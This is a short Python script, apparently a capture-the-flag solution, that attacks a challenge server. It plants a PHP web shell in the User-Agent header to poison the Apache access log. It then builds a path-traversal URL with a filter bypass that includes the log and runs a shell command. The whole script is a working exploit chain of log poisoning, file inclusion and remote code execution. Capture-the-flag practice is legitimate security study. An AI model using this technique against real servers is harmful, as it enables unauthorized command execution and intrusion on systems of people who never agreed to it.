import requests

URL = "http://01.linux.challenges.ctf.thefewchosen.com:52210"

r = requests.Session()
r.headers.update({"User-Agent": "<?php system($_GET['cmd']); ?>"})
r.get(URL)
print(URL+"/?file=....//....//....//....//var/log/apache2/access.log&cmd=ls%20/")